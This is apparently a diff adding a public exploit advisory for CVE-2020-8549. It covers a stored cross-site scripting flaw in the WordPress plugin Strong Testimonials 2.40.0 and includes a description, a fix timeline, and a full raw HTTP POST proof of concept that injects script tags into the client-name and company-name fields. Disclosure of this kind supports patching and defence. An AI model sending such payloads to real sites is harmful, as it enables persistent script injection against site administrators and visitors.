@@ -1,0 +1,43 @@
+# Exploit Title: Wordpress Plugin Strong Testimonials 2.40.0 - Persistent Cross-Site Scripting
+# Date: 2020-01-23
+# Vendor Homepage: https://strongtestimonials.com
+# Vendor Changelog: https://github.com/MachoThemes/strong-testimonials/blob/master/changelog.txt
+# Exploit Author: Jinson Varghese Behanan
+# Author Advisory: https://www.getastra.com/blog/911/plugin-exploit/stored-xss-vulnerability-found-in-strong-testimonials-plugin/
+# Author Homepage: https://www.jinsonvarghese.com
+# Version: 2.40.0 and below
+# CVE : CVE-2020-8549
+
+# 1. Description
+# Strong Testimonials is a popular and easily customizable WordPress testimonial plugin with 
+# over 90,000 active installations. In the client details section which is seen when adding 
+# or editing a testimonial, the custom[client_name] and custom[company_name] parameters 
+# were found to be vulnerable to stored cross-site scripting. All WordPress websites 
+# using Strong Testimonials version 2.40.0 and below are affected.
+
+2. Proof of Concept
+
+When the testimonial is added to a page on the site, the XSS payload passed in both of the above mentioned vulnerable parameters get executed.
+
+The payload in custom[client_name] also gets executed in the All Testimonials (/wp-admin/edit.php?post_type=wpm-testimonial) page.
+
+POST /wp-admin/post.php HTTP/1.1
+Host: testing.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:72.0) Gecko/20100101 Firefox/72.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://testing.com/wp-admin/post.php?post=24879&action=edit
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 1402
+Origin: http://testing.com
+Connection: close
+Cookie: wordpress_f5085b107e100d9e2687f38209d91671=jinson%7C1582988788%7CQJZkFRVzEdZRVbgZsiJIXldlEPTlfFOij2iybAHoVe6%7Cbf600418ab822f99fc55eb651acb102beaa01b055292c0f9d84667c7b490c60c; wp-saving-post=24879-check; wordpress_cf_adm_use_adm=1; wp-settings-time-1=1581780228; PHPSESSID=aeb50c30210014eec857909f45b3fbf3; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_f5085b107e100d9e2687f38209d91671=jinson%7C1582988788%7CQJZkFRVzEdZRVbgZsiJIXldlEPTlfFOij2iybAHoVe6%7C376e10c1fa5aeea389a485d0475f4c7dfe659f41d3b21f1b0bf6435838c003c5; tk_ai=woo%3AEeO%2FMlU5TcDNKIjgYWPHxZVg
+Upgrade-Insecure-Requests: 1
+
+_wpnonce=001abb6a10&_wp_http_referer=%2Fwp-admin%2Fpost.php%3Fpost%3D24879%26action%3Dedit%26message%3D1&user_ID=1&action=editpost&originalaction=editpost&post_author=1&post_type=wpm-testimonial&original_post_status=publish&referredby=http%3A%2F%2Ftesting.com%2Fwp-admin%2Fpost.php%3Fpost%3D24879%26action%3Dedit&_wp_original_http_referer=http%3A%2F%2Ftesting.com%2Fwp-admin%2Fpost.php%3Fpost%3D24879%26action%3Dedit&post_ID=24879&meta-box-order-nonce=b39d630598&closedpostboxesnonce=6436439491&original_post_title=XSS+Test&post_title=XSS+Test&samplepermalinknonce=d93284f5e5&content=&wp-preview=&hidden_post_status=publish&post_status=publish&hidden_post_password=&hidden_post_visibility=public&visibility=public&post_password=&mm=01&jj=22&aa=2020&hh=18&mn=02&ss=28&hidden_mm=01&cur_mm=02&hidden_jj=22&cur_jj=15&hidden_aa=2020&cur_aa=2020&hidden_hh=18&cur_hh=15&hidden_mn=02&cur_mn=23&original_publish=Update&save=Update&tax_input%5Bwpm-testimonial-category%5D%5B%5D=0&newwpm-testimonial-category=New+Category+Name&newwpm-testimonial-category_parent=-1&_ajax_nonce-add-wpm-testimonial-category=f7661627a5&menu_order=0&_thumbnail_id=-1&custom%5Bclient_name%5D=%3Cscript%3Ealert%28%27all+testimonials+page%27%29%3C%2Fscript%3E&custom%5Bemail%5D=&custom%5Bcompany_name%5D=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&custom%5Bcompany_website%5D=&custom%5Bnofollow%5D=default&excerpt=&post_name=creator
+
+3. Timeline
+
+Vulnerability reported to the Strong Testimonials team – January 23, 2020
+Strong Testimonials version 2.40.1 containing the fix released – January 25, 2020
